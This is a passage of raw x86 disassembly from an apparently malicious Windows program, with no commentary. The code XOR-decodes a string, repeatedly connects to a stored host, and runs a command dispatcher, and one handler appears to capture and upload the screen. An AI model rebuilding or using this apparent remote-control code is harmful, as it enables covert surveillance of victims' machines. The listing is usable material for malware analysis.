  404ade:	0f b6 88 44 b0 40 00 	movzbl 0x40b044(%eax),%ecx
  404ae5:	85 c9                	test   %ecx,%ecx
  404ae7:	74 2d                	je     0x404b16
  404ae9:	8b 95 3c fd ff ff    	mov    -0x2c4(%ebp),%edx
  404aef:	0f b6 82 44 b0 40 00 	movzbl 0x40b044(%edx),%eax
  404af6:	83 f0 5a             	xor    $0x5a,%eax
  404af9:	8b 8d 3c fd ff ff    	mov    -0x2c4(%ebp),%ecx
  404aff:	88 81 44 b0 40 00    	mov    %al,0x40b044(%ecx)
  404b05:	8b 95 3c fd ff ff    	mov    -0x2c4(%ebp),%edx
  404b0b:	83 c2 01             	add    $0x1,%edx
  404b0e:	89 95 3c fd ff ff    	mov    %edx,-0x2c4(%ebp)
  404b14:	eb c2                	jmp    0x404ad8
  404b16:	c7 05 b8 de 40 00 01 	movl   $0x1,0x40deb8
  404b1d:	00 00 00 
  404b20:	6a 01                	push   $0x1
  404b22:	6a 00                	push   $0x0
  404b24:	6a 00                	push   $0x0
  404b26:	8d 85 40 fd ff ff    	lea    -0x2c0(%ebp),%eax
  404b2c:	50                   	push   %eax
  404b2d:	68 44 b0 40 00       	push   $0x40b044
  404b32:	6a 00                	push   $0x0
  404b34:	ff 15 88 dd 40 00    	call   *0x40dd88
  404b3a:	eb 1e                	jmp    0x404b5a
  404b3c:	83 3d a0 de 40 00 00 	cmpl   $0x0,0x40dea0
  404b43:	75 15                	jne    0x404b5a
  404b45:	6a 00                	push   $0x0
  404b47:	6a 00                	push   $0x0
  404b49:	6a 00                	push   $0x0
  404b4b:	68 80 4d 40 00       	push   $0x404d80
  404b50:	6a 00                	push   $0x0
  404b52:	6a 00                	push   $0x0
  404b54:	ff 15 40 dd 40 00    	call   *0x40dd40
  404b5a:	33 c0                	xor    %eax,%eax
  404b5c:	5f                   	pop    %edi
  404b5d:	5e                   	pop    %esi
  404b5e:	8b e5                	mov    %ebp,%esp
  404b60:	5d                   	pop    %ebp
  404b61:	c3                   	ret
  404b62:	8b ff                	mov    %edi,%edi
  404b64:	09 49 40             	or     %ecx,0x40(%ecx)
  404b67:	00 3c 4b             	add    %bh,(%ebx,%ecx,2)
  404b6a:	40                   	inc    %eax
  404b6b:	00 5a 49             	add    %bl,0x49(%edx)
  404b6e:	40                   	inc    %eax
  404b6f:	00 13                	add    %dl,(%ebx)
  404b71:	49                   	dec    %ecx
  404b72:	40                   	inc    %eax
  404b73:	00 27                	add    %ah,(%edi)
  404b75:	49                   	dec    %ecx
  404b76:	40                   	inc    %eax
  404b77:	00 8c 49 40 00 9d 49 	add    %cl,0x499d0040(%ecx,%ecx,2)
  404b7e:	40                   	inc    %eax
  404b7f:	00 cc                	add    %cl,%ah
  404b81:	49                   	dec    %ecx
  404b82:	40                   	inc    %eax
  404b83:	00 0d 4a 40 00 41    	add    %cl,0x4100404a
  404b89:	4a                   	dec    %edx
  404b8a:	40                   	inc    %eax
  404b8b:	00 8c 4a 40 00 fa 48 	add    %cl,0x48fa0040(%edx,%ecx,2)
  404b92:	40                   	inc    %eax
  404b93:	00 5a 4b             	add    %bl,0x4b(%edx)
  404b96:	40                   	inc    %eax
  404b97:	00 00                	add    %al,(%eax)
  404b99:	0c 0c                	or     $0xc,%al
  404b9b:	0c 0c                	or     $0xc,%al
  404b9d:	0c 0c                	or     $0xc,%al
  404b9f:	0c 0c                	or     $0xc,%al
  404ba1:	0c 0c                	or     $0xc,%al
  404ba3:	0c 0c                	or     $0xc,%al
  404ba5:	0c 0c                	or     $0xc,%al
  404ba7:	0c 0c                	or     $0xc,%al
  404ba9:	0c 0c                	or     $0xc,%al
  404bab:	0c 0c                	or     $0xc,%al
  404bad:	0c 0c                	or     $0xc,%al
  404baf:	0c 0c                	or     $0xc,%al
  404bb1:	0c 0c                	or     $0xc,%al
  404bb3:	0c 0c                	or     $0xc,%al
  404bb5:	0c 0c                	or     $0xc,%al
  404bb7:	0c 0c                	or     $0xc,%al
  404bb9:	0c 0c                	or     $0xc,%al
  404bbb:	0c 0c                	or     $0xc,%al
  404bbd:	0c 0c                	or     $0xc,%al
  404bbf:	0c 0c                	or     $0xc,%al
  404bc1:	0c 0c                	or     $0xc,%al
  404bc3:	0c 0c                	or     $0xc,%al
  404bc5:	0c 0c                	or     $0xc,%al
  404bc7:	0c 01                	or     $0x1,%al
  404bc9:	0c 0c                	or     $0xc,%al
  404bcb:	0c 0c                	or     $0xc,%al
  404bcd:	0c 0c                	or     $0xc,%al
  404bcf:	0c 0c                	or     $0xc,%al
  404bd1:	0c 0c                	or     $0xc,%al
  404bd3:	0c 0c                	or     $0xc,%al
  404bd5:	02 03                	add    (%ebx),%al
  404bd7:	04 0c                	add    $0xc,%al
  404bd9:	0c 0c                	or     $0xc,%al
  404bdb:	0c 0c                	or     $0xc,%al
  404bdd:	0c 0c                	or     $0xc,%al
  404bdf:	0c 0c                	or     $0xc,%al
  404be1:	0c 0c                	or     $0xc,%al
  404be3:	0c 0c                	or     $0xc,%al
  404be5:	05 06 07 08 09       	add    $0x9080706,%eax
  404bea:	0a 0c 0c             	or     (%esp,%ecx,1),%cl
  404bed:	0c 0c                	or     $0xc,%al
  404bef:	0c 0c                	or     $0xc,%al
  404bf1:	0c 0c                	or     $0xc,%al
  404bf3:	0c 0c                	or     $0xc,%al
  404bf5:	0c 0c                	or     $0xc,%al
  404bf7:	0c 0c                	or     $0xc,%al
  404bf9:	0c 0c                	or     $0xc,%al
  404bfb:	0c 0c                	or     $0xc,%al
  404bfd:	0c 0c                	or     $0xc,%al
  404bff:	0c 0c                	or     $0xc,%al
  404c01:	0c 0c                	or     $0xc,%al
  404c03:	0c 0c                	or     $0xc,%al
  404c05:	0c 0c                	or     $0xc,%al
  404c07:	0c 0c                	or     $0xc,%al
  404c09:	0c 0c                	or     $0xc,%al
  404c0b:	0c 0c                	or     $0xc,%al
  404c0d:	0c 0c                	or     $0xc,%al
  404c0f:	0c 0c                	or     $0xc,%al
  404c11:	0c 0c                	or     $0xc,%al
  404c13:	0c 0c                	or     $0xc,%al
  404c15:	0c 0c                	or     $0xc,%al
  404c17:	0c 0c                	or     $0xc,%al
  404c19:	0c 0c                	or     $0xc,%al
  404c1b:	0c 0c                	or     $0xc,%al
  404c1d:	0c 0c                	or     $0xc,%al
  404c1f:	0c 0c                	or     $0xc,%al
  404c21:	0c 0c                	or     $0xc,%al
  404c23:	0c 0c                	or     $0xc,%al
  404c25:	0c 0c                	or     $0xc,%al
  404c27:	0c 0c                	or     $0xc,%al
  404c29:	0c 0c                	or     $0xc,%al
  404c2b:	0c 0c                	or     $0xc,%al
  404c2d:	0c 0c                	or     $0xc,%al
  404c2f:	0c 0c                	or     $0xc,%al
  404c31:	0c 0c                	or     $0xc,%al
  404c33:	0c 0c                	or     $0xc,%al
  404c35:	0c 0c                	or     $0xc,%al
  404c37:	0c 0c                	or     $0xc,%al
  404c39:	0c 0c                	or     $0xc,%al
  404c3b:	0c 0c                	or     $0xc,%al
  404c3d:	0c 0c                	or     $0xc,%al
  404c3f:	0c 0c                	or     $0xc,%al
  404c41:	0c 0c                	or     $0xc,%al
  404c43:	0c 0c                	or     $0xc,%al
  404c45:	0c 0c                	or     $0xc,%al
  404c47:	0c 0c                	or     $0xc,%al
  404c49:	0c 0c                	or     $0xc,%al
  404c4b:	0c 0c                	or     $0xc,%al
  404c4d:	0c 0c                	or     $0xc,%al
  404c4f:	0c 0c                	or     $0xc,%al
  404c51:	0c 0c                	or     $0xc,%al
  404c53:	0c 0c                	or     $0xc,%al
  404c55:	0c 0c                	or     $0xc,%al
  404c57:	0c 0c                	or     $0xc,%al
  404c59:	0c 0c                	or     $0xc,%al
  404c5b:	0c 0c                	or     $0xc,%al
  404c5d:	0c 0c                	or     $0xc,%al
  404c5f:	0c 0c                	or     $0xc,%al
  404c61:	0c 0c                	or     $0xc,%al
  404c63:	0c 0c                	or     $0xc,%al
  404c65:	0c 0c                	or     $0xc,%al
  404c67:	0c 0c                	or     $0xc,%al
  404c69:	0c 0c                	or     $0xc,%al
  404c6b:	0c 0c                	or     $0xc,%al
  404c6d:	0c 0c                	or     $0xc,%al
  404c6f:	0c 0c                	or     $0xc,%al
  404c71:	0c 0c                	or     $0xc,%al
  404c73:	0b cc                	or     %esp,%ecx
  404c75:	cc                   	int3
  404c76:	cc                   	int3
  404c77:	cc                   	int3
  404c78:	cc                   	int3
  404c79:	cc                   	int3
  404c7a:	cc                   	int3
  404c7b:	cc                   	int3
  404c7c:	cc                   	int3
  404c7d:	cc                   	int3
  404c7e:	cc                   	int3
  404c7f:	cc                   	int3
  404c80:	55                   	push   %ebp
  404c81:	8b ec                	mov    %esp,%ebp
  404c83:	81 ec 30 02 00 00    	sub    $0x230,%esp
  404c89:	56                   	push   %esi
  404c8a:	57                   	push   %edi
  404c8b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404c8e:	50                   	push   %eax
  404c8f:	e8 fc d7 ff ff       	call   0x402490
  404c94:	85 c0                	test   %eax,%eax
  404c96:	0f 84 ba 00 00 00    	je     0x404d56
  404c9c:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  404ca3:	eb 09                	jmp    0x404cae
  404ca5:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404ca8:	83 c1 01             	add    $0x1,%ecx
  404cab:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  404cae:	83 7d f8 03          	cmpl   $0x3,-0x8(%ebp)
  404cb2:	7d 1d                	jge    0x404cd1
  404cb4:	8b 15 18 b0 40 00    	mov    0x40b018,%edx
  404cba:	52                   	push   %edx
  404cbb:	68 0c b0 40 00       	push   $0x40b00c
  404cc0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404cc3:	50                   	push   %eax
  404cc4:	e8 67 d8 ff ff       	call   0x402530
  404cc9:	85 c0                	test   %eax,%eax
  404ccb:	74 02                	je     0x404ccf
  404ccd:	eb 02                	jmp    0x404cd1
  404ccf:	eb d4                	jmp    0x404ca5
  404cd1:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%ebp)
  404cd5:	74 7f                	je     0x404d56
  404cd7:	6a 00                	push   $0x0
  404cd9:	6a 07                	push   $0x7
  404cdb:	6a 00                	push   $0x0
  404cdd:	6a 00                	push   $0x0
  404cdf:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404ce2:	51                   	push   %ecx
  404ce3:	e8 98 d8 ff ff       	call   0x402580
  404ce8:	85 c0                	test   %eax,%eax
  404cea:	74 6a                	je     0x404d56
  404cec:	68 18 d9 40 00       	push   $0x40d918
  404cf1:	8d 95 d0 fd ff ff    	lea    -0x230(%ebp),%edx
  404cf7:	52                   	push   %edx
  404cf8:	e8 f3 c6 ff ff       	call   0x4013f0
  404cfd:	b9 2e 00 00 00       	mov    $0x2e,%ecx
  404d02:	8b f0                	mov    %eax,%esi
  404d04:	8d bd 88 fe ff ff    	lea    -0x178(%ebp),%edi
  404d0a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404d0c:	b9 2e 00 00 00       	mov    $0x2e,%ecx
  404d11:	8d b5 88 fe ff ff    	lea    -0x178(%ebp),%esi
  404d17:	8d bd 40 ff ff ff    	lea    -0xc0(%ebp),%edi
  404d1d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404d1f:	6a 00                	push   $0x0
  404d21:	6a 00                	push   $0x0
  404d23:	68 b8 00 00 00       	push   $0xb8
  404d28:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
  404d2e:	50                   	push   %eax
  404d2f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404d32:	51                   	push   %ecx
  404d33:	e8 48 d8 ff ff       	call   0x402580
  404d38:	81 ec b8 00 00 00    	sub    $0xb8,%esp
  404d3e:	b9 2e 00 00 00       	mov    $0x2e,%ecx
  404d43:	8d b5 40 ff ff ff    	lea    -0xc0(%ebp),%esi
  404d49:	8b fc                	mov    %esp,%edi
  404d4b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404d4d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404d50:	52                   	push   %edx
  404d51:	e8 2a c9 ff ff       	call   0x401680
  404d56:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404d59:	50                   	push   %eax
  404d5a:	e8 21 da ff ff       	call   0x402780
  404d5f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404d62:	51                   	push   %ecx
  404d63:	e8 38 da ff ff       	call   0x4027a0
  404d68:	33 c0                	xor    %eax,%eax
  404d6a:	5f                   	pop    %edi
  404d6b:	5e                   	pop    %esi
  404d6c:	8b e5                	mov    %ebp,%esp
  404d6e:	5d                   	pop    %ebp
  404d6f:	c2 04 00             	ret    $0x4
  404d72:	cc                   	int3
  404d73:	cc                   	int3
  404d74:	cc                   	int3
  404d75:	cc                   	int3
  404d76:	cc                   	int3
  404d77:	cc                   	int3
  404d78:	cc                   	int3
  404d79:	cc                   	int3
  404d7a:	cc                   	int3
  404d7b:	cc                   	int3
  404d7c:	cc                   	int3
  404d7d:	cc                   	int3
  404d7e:	cc                   	int3
  404d7f:	cc                   	int3
  404d80:	55                   	push   %ebp
  404d81:	8b ec                	mov    %esp,%ebp
  404d83:	81 ec 98 00 00 00    	sub    $0x98,%esp
  404d89:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404d8c:	50                   	push   %eax
  404d8d:	e8 fe d6 ff ff       	call   0x402490
  404d92:	85 c0                	test   %eax,%eax
  404d94:	0f 84 ae 03 00 00    	je     0x405148
  404d9a:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  404da1:	eb 09                	jmp    0x404dac
  404da3:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404da6:	83 c1 01             	add    $0x1,%ecx
  404da9:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  404dac:	83 7d f8 03          	cmpl   $0x3,-0x8(%ebp)
  404db0:	7d 1d                	jge    0x404dcf
  404db2:	8b 15 18 b0 40 00    	mov    0x40b018,%edx
  404db8:	52                   	push   %edx
  404db9:	68 0c b0 40 00       	push   $0x40b00c
  404dbe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404dc1:	50                   	push   %eax
  404dc2:	e8 69 d7 ff ff       	call   0x402530
  404dc7:	85 c0                	test   %eax,%eax
  404dc9:	74 02                	je     0x404dcd
  404dcb:	eb 02                	jmp    0x404dcf
  404dcd:	eb d4                	jmp    0x404da3
  404dcf:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%ebp)
  404dd3:	0f 84 6f 03 00 00    	je     0x405148
  404dd9:	6a 00                	push   $0x0
  404ddb:	6a 08                	push   $0x8
  404ddd:	6a 00                	push   $0x0
  404ddf:	6a 00                	push   $0x0
  404de1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404de4:	51                   	push   %ecx
  404de5:	e8 96 d7 ff ff       	call   0x402580
  404dea:	85 c0                	test   %eax,%eax
  404dec:	0f 84 56 03 00 00    	je     0x405148
  404df2:	6a 20                	push   $0x20
  404df4:	e8 5f 2b 00 00       	call   0x407958
  404df9:	83 c4 04             	add    $0x4,%esp
  404dfc:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  404e02:	8b 95 70 ff ff ff    	mov    -0x90(%ebp),%edx
  404e08:	89 55 f4             	mov    %edx,-0xc(%ebp)
  404e0b:	b8 01 00 00 00       	mov    $0x1,%eax
  404e10:	85 c0                	test   %eax,%eax
  404e12:	0f 84 18 03 00 00    	je     0x405130
  404e18:	6a 20                	push   $0x20
  404e1a:	6a 00                	push   $0x0
  404e1c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404e1f:	51                   	push   %ecx
  404e20:	e8 ef 2a 00 00       	call   0x407914
  404e25:	83 c4 0c             	add    $0xc,%esp
  404e28:	6a 00                	push   $0x0
  404e2a:	6a 00                	push   $0x0
  404e2c:	6a 20                	push   $0x20
  404e2e:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404e31:	52                   	push   %edx
  404e32:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404e35:	50                   	push   %eax
  404e36:	e8 d5 d8 ff ff       	call   0x402710
  404e3b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404e3e:	83 7d f0 ff          	cmpl   $0xffffffff,-0x10(%ebp)
  404e42:	75 0f                	jne    0x404e53
  404e44:	c7 05 a0 de 40 00 00 	movl   $0x0,0x40dea0
  404e4b:	00 00 00 
  404e4e:	e9 dd 02 00 00       	jmp    0x405130
  404e53:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404e56:	0f b6 11             	movzbl (%ecx),%edx
  404e59:	89 95 68 ff ff ff    	mov    %edx,-0x98(%ebp)
  404e5f:	8b 85 68 ff ff ff    	mov    -0x98(%ebp),%eax
  404e65:	83 e8 12             	sub    $0x12,%eax
  404e68:	89 85 68 ff ff ff    	mov    %eax,-0x98(%ebp)
  404e6e:	83 bd 68 ff ff ff 23 	cmpl   $0x23,-0x98(%ebp)
  404e75:	0f 87 b0 02 00 00    	ja     0x40512b
  404e7b:	8b 8d 68 ff ff ff    	mov    -0x98(%ebp),%ecx
  404e81:	0f b6 91 9c 51 40 00 	movzbl 0x40519c(%ecx),%edx
  404e88:	ff 24 95 6c 51 40 00 	jmp    *0x40516c(,%edx,4)
  404e8f:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%ebp)
  404e96:	6a 00                	push   $0x0
  404e98:	ff 15 54 de 40 00    	call   *0x40de54
  404e9e:	89 45 d0             	mov    %eax,-0x30(%ebp)
  404ea1:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  404ea8:	6a 01                	push   $0x1
  404eaa:	ff 15 54 de 40 00    	call   *0x40de54
  404eb0:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404eb3:	83 ec 10             	sub    $0x10,%esp
  404eb6:	8b c4                	mov    %esp,%eax
  404eb8:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  404ebb:	89 08                	mov    %ecx,(%eax)
  404ebd:	8b 55 cc             	mov    -0x34(%ebp),%edx
  404ec0:	89 50 04             	mov    %edx,0x4(%eax)
  404ec3:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  404ec6:	89 48 08             	mov    %ecx,0x8(%eax)
  404ec9:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  404ecc:	89 50 0c             	mov    %edx,0xc(%eax)
  404ecf:	e8 ac e5 ff ff       	call   0x403480
  404ed4:	83 c4 10             	add    $0x10,%esp
  404ed7:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404eda:	6a 08                	push   $0x8
  404edc:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404edf:	50                   	push   %eax
  404ee0:	e8 db e6 ff ff       	call   0x4035c0
  404ee5:	83 c4 08             	add    $0x8,%esp
  404ee8:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404eeb:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404eee:	51                   	push   %ecx
  404eef:	ff 15 98 de 40 00    	call   *0x40de98
  404ef5:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404ef8:	52                   	push   %edx
  404ef9:	e8 62 1d 00 00       	call   0x406c60
  404efe:	89 45 dc             	mov    %eax,-0x24(%ebp)
  404f01:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404f04:	50                   	push   %eax
  404f05:	ff 15 f4 dd 40 00    	call   *0x40ddf4
  404f0b:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  404f0e:	51                   	push   %ecx
  404f0f:	ff 15 e8 dd 40 00    	call   *0x40dde8
  404f15:	89 45 d8             	mov    %eax,-0x28(%ebp)
  404f18:	6a 00                	push   $0x0
  404f1a:	6a 00                	push   $0x0
  404f1c:	6a 1c                	push   $0x1c
  404f1e:	8d 55 c0             	lea    -0x40(%ebp),%edx
  404f21:	52                   	push   %edx
  404f22:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404f25:	50                   	push   %eax
  404f26:	e8 55 d6 ff ff       	call   0x402580
  404f2b:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  404f2e:	51                   	push   %ecx
  404f2f:	ff 15 ec dd 40 00    	call   *0x40ddec
  404f35:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404f38:	33 d2                	xor    %edx,%edx
  404f3a:	66 89 55 bc          	mov    %dx,-0x44(%ebp)
  404f3e:	eb 0c                	jmp    0x404f4c
  404f40:	66 8b 45 bc          	mov    -0x44(%ebp),%ax
  404f44:	66 83 c0 01          	add    $0x1,%ax
  404f48:	66 89 45 bc          	mov    %ax,-0x44(%ebp)
  404f4c:	0f b7 4d bc          	movzwl -0x44(%ebp),%ecx
  404f50:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404f53:	c1 ea 0a             	shr    $0xa,%edx
  404f56:	3b ca                	cmp    %edx,%ecx
  404f58:	73 2f                	jae    0x404f89
  404f5a:	6a 00                	push   $0x0
  404f5c:	6a 00                	push   $0x0
  404f5e:	68 00 04 00 00       	push   $0x400
  404f63:	0f b7 45 bc          	movzwl -0x44(%ebp),%eax
  404f67:	c1 e0 0a             	shl    $0xa,%eax
  404f6a:	03 45 e8             	add    -0x18(%ebp),%eax
  404f6d:	50                   	push   %eax
  404f6e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404f71:	51                   	push   %ecx
  404f72:	e8 09 d6 ff ff       	call   0x402580
  404f77:	85 c0                	test   %eax,%eax
  404f79:	75 0c                	jne    0x404f87
  404f7b:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404f7e:	52                   	push   %edx
  404f7f:	ff 15 f4 dd 40 00    	call   *0x40ddf4
  404f85:	eb 02                	jmp    0x404f89
  404f87:	eb b7                	jmp    0x404f40
  404f89:	8b 45 d8             	mov    -0x28(%ebp),%eax
  404f8c:	33 d2                	xor    %edx,%edx
  404f8e:	b9 00 04 00 00       	mov    $0x400,%ecx
  404f93:	f7 f1                	div    %ecx
  404f95:	89 55 e0             	mov    %edx,-0x20(%ebp)
  404f98:	6a 00                	push   $0x0
  404f9a:	6a 00                	push   $0x0
  404f9c:	8b 55 e0             	mov    -0x20(%ebp),%edx
  404f9f:	52                   	push   %edx
  404fa0:	8b 45 d8             	mov    -0x28(%ebp),%eax
  404fa3:	c1 e8 0a             	shr    $0xa,%eax
  404fa6:	c1 e0 0a             	shl    $0xa,%eax
  404fa9:	03 45 e8             	add    -0x18(%ebp),%eax
  404fac:	50                   	push   %eax
  404fad:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404fb0:	51                   	push   %ecx
  404fb1:	e8 ca d5 ff ff       	call   0x402580
  404fb6:	85 c0                	test   %eax,%eax
  404fb8:	75 0a                	jne    0x404fc4
  404fba:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404fbd:	52                   	push   %edx
  404fbe:	ff 15 f4 dd 40 00    	call   *0x40ddf4
  404fc4:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404fc7:	50                   	push   %eax
  404fc8:	ff 15 f4 dd 40 00    	call   *0x40ddf4
  404fce:	e9 58 01 00 00       	jmp    0x40512b
  404fd3:	e9 53 01 00 00       	jmp    0x40512b
  404fd8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404fdb:	8b 51 01             	mov    0x1(%ecx),%edx
  404fde:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  404fe1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404fe4:	8b 48 05             	mov    0x5(%eax),%ecx
  404fe7:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  404fea:	8b 55 b8             	mov    -0x48(%ebp),%edx
  404fed:	52                   	push   %edx
  404fee:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  404ff1:	50                   	push   %eax
  404ff2:	e8 49 e2 ff ff       	call   0x403240
  404ff7:	e9 2f 01 00 00       	jmp    0x40512b
  404ffc:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404fff:	8b 51 01             	mov    0x1(%ecx),%edx
  405002:	89 55 ac             	mov    %edx,-0x54(%ebp)
  405005:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405008:	8b 48 05             	mov    0x5(%eax),%ecx
  40500b:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  40500e:	8b 55 b0             	mov    -0x50(%ebp),%edx
  405011:	52                   	push   %edx
  405012:	8b 45 ac             	mov    -0x54(%ebp),%eax
  405015:	50                   	push   %eax
  405016:	e8 75 e2 ff ff       	call   0x403290
  40501b:	e9 0b 01 00 00       	jmp    0x40512b
  405020:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405023:	8b 51 01             	mov    0x1(%ecx),%edx
  405026:	89 55 a4             	mov    %edx,-0x5c(%ebp)
  405029:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40502c:	8b 48 05             	mov    0x5(%eax),%ecx
  40502f:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  405032:	8b 55 a8             	mov    -0x58(%ebp),%edx
  405035:	52                   	push   %edx
  405036:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  405039:	50                   	push   %eax
  40503a:	e8 81 e2 ff ff       	call   0x4032c0
  40503f:	e9 e7 00 00 00       	jmp    0x40512b
  405044:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405047:	8b 51 01             	mov    0x1(%ecx),%edx
  40504a:	89 55 9c             	mov    %edx,-0x64(%ebp)
  40504d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405050:	8b 48 05             	mov    0x5(%eax),%ecx
  405053:	89 4d a0             	mov    %ecx,-0x60(%ebp)
  405056:	8b 55 a0             	mov    -0x60(%ebp),%edx
  405059:	52                   	push   %edx
  40505a:	8b 45 9c             	mov    -0x64(%ebp),%eax
  40505d:	50                   	push   %eax
  40505e:	e8 8d e2 ff ff       	call   0x4032f0
  405063:	e9 c3 00 00 00       	jmp    0x40512b
  405068:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40506b:	8b 51 01             	mov    0x1(%ecx),%edx
  40506e:	89 55 94             	mov    %edx,-0x6c(%ebp)
  405071:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405074:	8b 48 05             	mov    0x5(%eax),%ecx
  405077:	89 4d 98             	mov    %ecx,-0x68(%ebp)
  40507a:	8b 55 98             	mov    -0x68(%ebp),%edx
  40507d:	52                   	push   %edx
  40507e:	8b 45 94             	mov    -0x6c(%ebp),%eax
  405081:	50                   	push   %eax
  405082:	e8 99 e2 ff ff       	call   0x403320
  405087:	e9 9f 00 00 00       	jmp    0x40512b
  40508c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40508f:	8b 51 01             	mov    0x1(%ecx),%edx
  405092:	89 55 8c             	mov    %edx,-0x74(%ebp)
  405095:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405098:	8b 48 05             	mov    0x5(%eax),%ecx
  40509b:	89 4d 90             	mov    %ecx,-0x70(%ebp)
  40509e:	8b 55 90             	mov    -0x70(%ebp),%edx
  4050a1:	52                   	push   %edx
  4050a2:	8b 45 8c             	mov    -0x74(%ebp),%eax
  4050a5:	50                   	push   %eax
  4050a6:	e8 a5 e2 ff ff       	call   0x403350
  4050ab:	eb 7e                	jmp    0x40512b
  4050ad:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4050b0:	8b 51 01             	mov    0x1(%ecx),%edx
  4050b3:	89 55 84             	mov    %edx,-0x7c(%ebp)
  4050b6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4050b9:	8b 48 05             	mov    0x5(%eax),%ecx
  4050bc:	89 4d 88             	mov    %ecx,-0x78(%ebp)
  4050bf:	8b 55 88             	mov    -0x78(%ebp),%edx
  4050c2:	52                   	push   %edx
  4050c3:	8b 45 84             	mov    -0x7c(%ebp),%eax
  4050c6:	50                   	push   %eax
  4050c7:	e8 d4 e2 ff ff       	call   0x4033a0
  4050cc:	eb 5d                	jmp    0x40512b
  4050ce:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4050d1:	8b 51 01             	mov    0x1(%ecx),%edx
  4050d4:	89 55 80             	mov    %edx,-0x80(%ebp)
  4050d7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4050da:	8b 48 05             	mov    0x5(%eax),%ecx
  4050dd:	89 8d 7c ff ff ff    	mov    %ecx,-0x84(%ebp)
  4050e3:	8b 95 7c ff ff ff    	mov    -0x84(%ebp),%edx
  4050e9:	52                   	push   %edx
  4050ea:	8b 45 80             	mov    -0x80(%ebp),%eax
  4050ed:	50                   	push   %eax
  4050ee:	e8 fd e2 ff ff       	call   0x4033f0
  4050f3:	eb 36                	jmp    0x40512b
  4050f5:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4050f8:	8b 51 01             	mov    0x1(%ecx),%edx
  4050fb:	89 95 78 ff ff ff    	mov    %edx,-0x88(%ebp)
  405101:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405104:	8b 48 05             	mov    0x5(%eax),%ecx
  405107:	89 8d 74 ff ff ff    	mov    %ecx,-0x8c(%ebp)
  40510d:	8b 95 74 ff ff ff    	mov    -0x8c(%ebp),%edx
  405113:	52                   	push   %edx
  405114:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  40511a:	50                   	push   %eax
  40511b:	e8 f0 e2 ff ff       	call   0x403410
  405120:	eb 09                	jmp    0x40512b
  405122:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405125:	51                   	push   %ecx
  405126:	e8 55 d6 ff ff       	call   0x402780
  40512b:	e9 db fc ff ff       	jmp    0x404e0b
  405130:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405133:	89 95 6c ff ff ff    	mov    %edx,-0x94(%ebp)
  405139:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
